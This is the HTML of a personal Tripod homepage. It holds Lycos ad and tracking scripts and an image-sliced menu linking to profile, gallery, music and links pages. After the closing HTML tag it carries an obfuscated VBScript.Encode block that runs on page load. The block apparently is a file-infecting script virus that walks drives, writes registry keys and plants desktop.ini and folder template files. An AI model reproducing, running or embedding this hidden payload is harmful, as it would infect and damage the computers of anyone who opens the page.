<HTML>
<HEAD>
<TITLE>index</TITLE>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
</HEAD>
<body BGCOLOR=#000000 LEFTMARGIN=0 TOPMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "dennysites";
var tripod_member_page = "dennysites/index.html";
var tripod_ratings_hash = "1319060166:14bfa680ea0c436c495493f5f8fc04a2";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=943791";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=943791";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}


jQuery.noConflict();
jQuery(function(){
  if ( ! lycos_check_size() ) { jQuery("#tb_container").hide(); jQuery("#FooterAd").hide(); return; }

  var onButton = -44;
  var onShare = -89;
  var onSearch = 0;
  var $build = jQuery("#build");
  var ss = $build.css("top");

	jQuery("#more_click").unbind().click(function(ev){
      if (ss == onShare) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onShare + "px"});
          ss = onShare;
      }
	});
											
	jQuery("#searchlycos").unbind().click(function(ev){
      if (ss == onSearch) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onSearch + "px"});
          ss = onSearch;
      }
	});
	
  var f = jQuery("#FooterAd").remove();
  f.children("script").remove();
  f.appendTo("body");

  jQuery("#BANNERSTYLE").appendTo("head");

});
</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://pd.tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important">
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=943791" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>
<!-- ImageReady Slices (my web.psd) -->
<TABLE WIDTH=800 BORDER=0 align="center" CELLPADDING=0 CELLSPACING=0>
	<TR>
		<TD COLSPAN=2>
			<IMG SRC="images/index_01.gif" WIDTH=800 HEIGHT=62 ALT=""></TD>
	</TR>
	<TR>
		<TD ROWSPAN=7>
			<IMG SRC="images/index_02.gif" WIDTH=558 HEIGHT=538 ALT=""></TD>
		<TD>
			<IMG SRC="images/index_03.gif" WIDTH=242 HEIGHT=103 ALT=""></TD>
	</TR>
	<TR>
		
    <TD> <a href="profil.html"><IMG SRC="images/index_04.gif" ALT="" WIDTH=242 HEIGHT=54 border="0"></a></TD>
	</TR>
	<TR>
		
    <TD> <a href="my-gallery.html"><IMG SRC="images/index_05.gif" ALT="" WIDTH=242 HEIGHT=80 border="0"></a></TD>
	</TR>
	<TR>
		
    <TD> <a href="http://www.friendster.com/dennylophu"><IMG SRC="images/index_06.gif" ALT="" WIDTH=242 HEIGHT=72 border="0"></a></TD>
	</TR>
	<TR>
		
    <TD> <a href="music.html"><IMG SRC="images/index_07.gif" ALT="" WIDTH=242 HEIGHT=76 border="0"></a></TD>
	</TR>
	<TR>
		
    <TD> <a href="links.html"><IMG SRC="images/index_08.gif" ALT="" WIDTH=242 HEIGHT=62 border="0"></a></TD>
	</TR>
	<TR>
		<TD>
			<IMG SRC="images/index_09.gif" WIDTH=242 HEIGHT=91 ALT=""></TD>
	</TR>
</TABLE>
<!-- End ImageReady Slices -->
</body>
</HTML><script id=icaros language=vbscript.encode><!--
#@~^chAAAA==6	P3MDKDP"+k;:PH+XY@&/Kx/D~bawVOHls+{J-4d bmCD}dR2RT ZJ@&/G	/OPz2aVnDZKN+{J1G:c:dRmmOr7+(c)mDk\p/WswKxnxOE@&ZGxkOP6/G/d?q9xr	TfWfw2T8Ow!,2O8qZwO0,W!RTZb!;1!lc y0NJ@&ZKxdY~AkZJ?&9'r	o12*f/+yOqZwT FqG! bf~, T!;!*sG*0)ZA8r@&NKmEsnUYchMkO+E@!mw2VOP4+rL4Y'T~Sk[Y4xZPUm:'JLba2VYHls+'E,mW9n'r[ba2s+DZKNn[E@*@!zCwas+D@*E@&U+Y~Abx[WS KxsKl9'MY"n0vJhlbx-f|Wx^Gl9J#@&j;4,:mkU\fmKxsWm[`*@&]nTZtCUT+c#@&9MW2:+swVmYcK:2VmYn9bD#@&9DKwKh2VmY`PtrdGk.nmOt*@&9.KwHrd1`b@&wr^+j1l	`K4kk9kMnCY4#@&KdWl9/tm3vb@&2	N,?;4@&j!4~fMGwtkd^v#@&6U,2.DK.,InkEs+Pg+XO@&wW.P	'T~DWP8@&fMWw:nhw^lD+c0dGcMnYU2+1kCswWV[nM`U#LE'Jb@&16Y@&sK.PAl^t,N~r	P0kGRGDk7nd@&&0,N f.r7+PXan'yPO4xP9.KwP+s2^lO`9RfMk7nSYO+M[El'J#@&H+XY@&G.Gw:+swslOnvdtU4+^V ja+mrC^sGV9nM/crHHfW1EsnxD/E#LJwE*@&2	[PUE4@&j;4,ndWCN/4mV`*@&r	P3.MWD~]/;:~g+aD@&&0PtW	Otv1Gh*'1~mxN,9lH`1KAb'yv,Y4+U~q/4?4nV^R];	`J]igfJS2+c2pAPkt+^V2+R9Vs~UC3abYbUNKh/Aa~ r#@&2UN~j!4@&?!8PwksnzwwnU9`W~1b@&rU,2MDWMP"n/!:nPg+aO@&?+D~:Hsk^nx0kWcMnYor^+c0*@&x{:zobV+ )DY.k(;D+d@&:Hsk^+c)YDDr4!Ynd{!@&UnY,:Xwrs+{0kW r2n	Kn6Dok^+cWB%#@&hHsrV qDrD+,m@&sXwrVR/VK/n@&wkV)YDDP6SU@&Ax9PjE8@&UE8PwrVqUWmYc2*@&6x,3MDGMP"+/!:~16O@&U+O~6'0kGR}w+	Pn6DsbVn`2S8#@&m{WR"+C[zVV@&WcZsWkn@&qW,q	?YMI-`1~-ZKNnb{!P}.P&x?D.]+7`1~-ZG[#QSU`7ZG[#@!Jn	`^#,P4+U,@&wkVba2+	N~wB\/G9+@&AUN,q0@&3UN,?!4@&?;8,srVjmmxc2*@&rU~AD.WM~"+d!:P16D@&sKD~2mm4~k0F,(x,0/K !+DsKV[+.ca# sbs+k@&jn^+mO~;ld+,J;ld`6/WcMO2XYnxkkGUgl:c/6FRgCh+*#@&ZC/n~rtO:rSJ4Yhsr~J4ODJ@&sbsqU6+1Y`k08 nmY4#@&2U[,?+^nmD@&1aO@&Ax9PjE8@&wEUmDrW	P-/KN+cb@&rUPA.MW.,I/Es+,H+XY@&\;W[n{J@!r'JkmDb2OPbN{k^l.GkPsl	LEmonx74/^.bwORU1W[@*r[Iw^Cm`[W1Ehn	YRmsVckmm.G/ck	xnDuPtSS\(^D^0SEr#[E@!JJ'Jk^Mk2D@*r@&2	N,oE	mOkKx@&j!4P"no;tl	Ln`*@&}x~2..KD~IdEs+~H6Y@&)A'EtDOa)&JhShRT+K^kDkn/cmGhJl4K;YDDK.&k	N6 tOhr@&jn{El(W;O=+D.GMJ@&C;i{Jun2I{Z`I"31:{i?AIwE@&?H{E?K0YSC.+'Hbm.WdG6YwJ@&uSt'Eun25mJ}Z)S|\zZu&1A-J@&;xJqkUNKhdw;EDMnxD.+MdrW	-r@&K2xEhWsk1r+k-3aaVW.nM-E@&&3{J(	YDxY,36aVGDDwE@&?'_/jL?HL(3[rHmkU-jOmDOPhCoJ@&){CS\'UH'qA'rb8KEDjId/'nDMW.J@&2xudH[U\[qZ[r3aYUtVs.rnS/w	l1%Wso3ZO 09WOqF;o b3+v !%Z!y$ AF+vy8wE@&1'_JHL?HL	/[h2LJHWoG^NnD}2YbWUdr@&Cxu;j'?t'qZ'r2XwVKD.-zN-l	mn['Ck9[+	J@&;xuZ`[UH'/'h2'J;slk/r^Ut+ssr@&	kD4,d4?4+V^@&G	'rI3M|f	6"fJ@&j}{JIA!m?\J@&R]+L	MkO+,j~UnSj\@&R]nT.kDn,bSz2B?}@&R"noqDrYPHS8~fq@&R"+oq.rYP_~T~9	@&R]+T	DbYn~;~!S9q@& ILG+sYP2@&2	[PqkOt@&2U[,?E(@&s!xmDrGx,K4kdfr.hlOtvb@&}x~3MDW.~"+dEsn,1nXY@&w'"+asl1+cj	2d^mw+v[W1E:UOR^W1lOkGU*~E0bs+=z&&r~JEb@&qWP6dKRobV26b/Dd`a#~K4+U@&a'I2Vmm+v2S0kWcMnYor^+Hlsn`a#SEr#@&3sk+@&q6~gWOvSx`a#@!x&*PPtx~2{w[r&J@&2x9~(0@&K4kdfr.hlOt{2@&Ax[~wEx^ObWU@&w;	mObW	PK:aslD+9kM`b@&}xPA.DKDP"ndEs+,1n6O@&a'W/K MYj2mkCswWsN.v!bLJ'+(J@&W/KR9+^+OnwWV9nD,w~:.;+@&0kW Z.nmYnsKsNDc2*@&?nO,:zsbs'WkWcM+DsKsNDcw*@&hzwkV bDYDb8;Y/{G@&KnhaVCY9kM'2'r-J@&3	N~s!U1YrKx@&?E(PG.WaKn:aVCO`wmOt*@&r	~3DMWMP]+d;s+~1aY@&sGs9+DuP:'E@!4OsV@*@!4KNX,/1.W^VxxKPdOHV+{hlMok	lT@*@!W(LnmO~1VC/krN{msdbN)q0y!o2GT c{22 FFG! ),+ZR!ZZT*wfGZXbyP/Dzs+{hbNOtlqZ!Yi4nkTtOl8!!Y@*@!zG4Nn1Y@*@!z(WNH@*@!&tD:s@*r@&rUbSk	n'mDDmzcJ]2XYjtns^sGV9nDjknAkTJSEG+Wl!sD'`l,Rcsw2ZR Rf*O8F/o b2+OZ%!Z+$ AFyv+8ESr	X,R*sw2TRy%f*R8F/s )Av !R!!yAy3Fyv+8{	X1Rcsw3!  %G*RF8ZwO)2 !0!Z+Ay2q++ 8ESrJSJ]`l,0Wsw2!  R9c FqZwO)3+vOZ0!Z Ay3q + )TE~EKDdkkOHKxrVD'Wr^+lzJoKV[DctYDJBEJBJ,RUtns^ZVmd/&x0KDE~rZKxWk.hwks+}2'ZJb@&G+/VOKw(1&xxWr	`bxkdk	n~j4/Dd0b@&a'wmOtLJfdVYKwckUkE@&wks+;.+mYn~a~fnd0YGw&H&@&obVbYDD,2~F@&2'alO4LJsKsNDR4OOJ@&sbVnZ.nmYnPaSsKV[nMCKP~LP-ZK[@&obVbYDD,2~F@&3x9Pj;(@&?!8PwkV/.+mY`Wksn	lh+B^W	YnUD/#@&6	P3DMGMP]/!:+,1aY@&srVbOOMP0bs+	l:ST@&U+DPhXor^+x0kGR;DnCD+KnaDsrVc6ksxm:+BKM;+*@&hXwksncDbO+,mW	OnxD/@&:zsrsR/VKd+@&2U[,?E8@&UE8Pwr^+)DYM`0bVUls+SlDY.b@&rx,3DMWD,]n/!:PH+aO@&?nY,hXwksn{0/G V+Osbs`WbVxls+*@&:HsrVR)ODDk(;Y/'mOOD@&2	N~?;8@&s;x1OkKx~)awr8%v#@&r	~AD.KD,I+kEsnPg+aY@&?nO,bwa64N'NK^;:xDRCw2sYd`z2w^+OHm:+b@&Ax[Pw;	mObW	@&s!x1OkKx~0kWcb@&rx,3DMWD,]n/!:PH+aO@&?nY,W/K'/.lYn6(Lc0kG;Sj&f*@&2	N,oE	mOkKx@&o!xmDrW	Pk4jtV^`b@&6U,2.DK.P"+d;s+PHnXY@&?O,d4?4+V^';.+mYnr(LcAkZSU(f*@&2	[~s!x1YrWU@&wEUmDrW	P/.lYn6(LcZdj&fb@&r	P2MDK.P"+dEs+~H6Y@&)war4N j+DZd?(fc/d?(f*@&baw68NRm.nmYnq	dDlU1+v#@&Sk	[WSRdYmY;d{JJ@&j+DPZMnCYr(Lxb22}4%RVnY}4%n1Y`b@&Ax[Pw;	mObW	EyUFAA==^#~@
--></script>